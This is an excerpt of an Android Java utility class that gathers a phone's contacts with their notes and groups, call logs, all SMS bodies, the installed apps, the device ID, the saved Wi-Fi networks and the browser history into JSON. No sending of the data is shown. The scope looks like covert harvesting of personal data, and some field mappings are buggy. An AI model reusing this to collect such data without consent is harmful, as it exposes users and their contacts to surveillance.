...
public class PhoneInfoUtils {
  ...
  public static JSONArray buildAllStringContacts(Context ctx) throws JSONException {
    ...
    ContentResolver ctxContentResolver = ctx.getContentResolver();
    ...
    if (cursor != null) {
      while (cursor.moveToNext()) {
        ...
        Cursor phone = ctxContentResolver.query(Phone.CONTENT_URI, null,
        ...
        //email
        Cursor email = ctxContentResolver
        ...
        //im
        Cursor im = ctxContentResolver.query(Data.CONTENT_URI,
        ...
        //address
        Cursor address = ctxContentResolver
        ...
        //organizations
        Cursor organizations = ctxContentResolver
        ...
        if (organizations != null) {
          while (organizations.moveToNext()) {
            stringList.add(organizations
                    .getString(organizations.getColumnIndex(Organization.COMPANY))
//                + organizations.getString(organizations.getColumnIndex(Organization.TITLE))
            );
          }
          organizations.close();
        ...
        //remarks info
        Cursor notes = ctxContentResolver.query(Data.CONTENT_URI, new String[]{Data._ID, Note.NOTE},
        ...
        //nickname
        Cursor nickNames = ctxContentResolver
            .query(Data.CONTENT_URI, new String[]{Data._ID, Nickname.NAME},
                Data.CONTACT_ID + " = " + id + " AND " + Data.MIMETYPE + " ='"
        ...
        //group
        Cursor groups = ctxContentResolver
    ...
    for (int i = 0; i < contactInfoList.size(); i++) {
      ...
      stoneObject.put("name", appInfo.getName() == null ? "null" : appInfo.getName());
      stoneObject.put("phone", appInfo.getPhone().replace(" ", "") == null ? "null"
          : appInfo.getPhone().replace(" ", ""));
      stoneObject.put("email", appInfo.getEmail() == null ? "null" : appInfo.getEmail());
      stoneObject.put("im", appInfo.getIm() == null ? "null" : appInfo.getIm());
      stoneObject.put("organizations",
          appInfo.getOrganizations() == null ? "null" : appInfo.getOrganizations());
      stoneObject.put("remarks", appInfo.getRemarks().replace(" ", "") == null ? "null"
          : appInfo.getRemarks().replace(" ", "").replace("/", "").replace(":", ""));
      stoneObject.put("niceName", appInfo.getNiceName());
      stoneObject.put("groups", appInfo.getGroup().replace(" ", "") == null ? "null"
          : appInfo.getGroup().replace(" ", "").replace("/", ""));
  ...
  public static JSONArray buildApps(Context context) throws JSONException {
    ...
    for (int i = 0; i < appsInfoArrayList.size(); i++) {
      ...
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("label", appInfo.getLabel() == null ? "null" : appInfo.getLabel());
      stoneObject
          .put("packageName", appInfo.getPackageName() == null ? "null" : appInfo.getPackageName());
      stoneObject
          .put("versionName", appInfo.getVersionName() == null ? "null" : appInfo.getVersionCode());
      stoneObject
          .put("versionCode", appInfo.getVersionCode() == null ? "null" : appInfo.getVersionName());
      array.put(stoneObject);
    }
    return array;
  }
   ...
   */
  public static JSONArray buildCallHistory(Context context)
    ...
    String[] projection = {
        ...
        Calls.NUMBER, // 号码
        Calls.TYPE, // 类型
        Calls.CACHED_NAME, // 名字
    };
    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    Uri callLogUri = Calls.CONTENT_URI;
    Cursor cursor = contentResolver
        .query(callLogUri, projection, null, null, Calls.DEFAULT_SORT_ORDER);
    if (cursor != null) {
      while (cursor.moveToNext()) {
        ...
        callHistoryInfo
            .setDate(sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(Calls.DATE)))));
        callHistoryInfo.setNumber(cursor.getString(cursor.getColumnIndex(Calls.NUMBER)));
    ...
    for (int i = 0; i < callHistoryList.size(); i++) {
      ...
      stoneObject.put("date", appInfo.getDate() == null ? "null" : appInfo.getDate());
      stoneObject.put("number", appInfo.getNumber() == null ? "null" : appInfo.getNumber());
      stoneObject.put("type", appInfo.getType() == null ? "null" : appInfo.getType());
      stoneObject
          .put("cachedName", appInfo.getCachedName() == null ? "null" : appInfo.getCachedName());
      array.put(stoneObject);
    }
    return array;
  }
  ...
  public static JSONObject buildPhoneInfo(Context context) throws JSONException {
    ...
    simInfo.setDeviceId(tm.getDeviceId() == null ? "null" : tm.getDeviceId());
  ...
  public static JSONArray buildAllSms(Context context) throws JSONException {
    ...
    for (int i = 0; i < allSmsInfoList.size(); i++) {
      ...
      JSONObject stoneObject = new JSONObject();
      stoneObject
          .put("address", appInfo.getStrAddress() == null ? "null" : appInfo.getStrAddress());
      stoneObject.put("body", appInfo.getStrBody() == null ? "null" : appInfo.getStrBody());
      stoneObject.put("date", appInfo.getStrDate() == null ? "null" : appInfo.getStrDate());
      stoneObject.put("type", appInfo.getStrType() == null ? "null" : appInfo.getStrType());
      array.put(stoneObject);
    }
    return array;
  }
  ...
  public static JSONArray buildConfiguredWifiList(Context context) throws JSONException {
    ...
    if (null != wifiConfigurations) {
      for (WifiConfiguration wifiConfiguration : wifiConfigurations) {
        ...
        stoneObject.put("wifiMac", wifiInfo.getBSSID() == null ? "null" : wifiInfo.getSSID());
  ...
  public static JSONArray buildBrowserHistory(Context context) throws JSONException {
    ...
    for (int i = 0; i < browserInfoList.size(); i++) {
      ...
      JSONObject stoneObject = new JSONObject();
      stoneObject.put("date", appInfo.getDate() == null ? "null" : appInfo.getDate());
      stoneObject.put("title", appInfo.getTitile() == null ? "null" : appInfo.getTitile());
      stoneObject.put("url", appInfo.getUrl() == null ? "null" : appInfo.getUrl());
      array.put(stoneObject);
    }
    return array;
  }
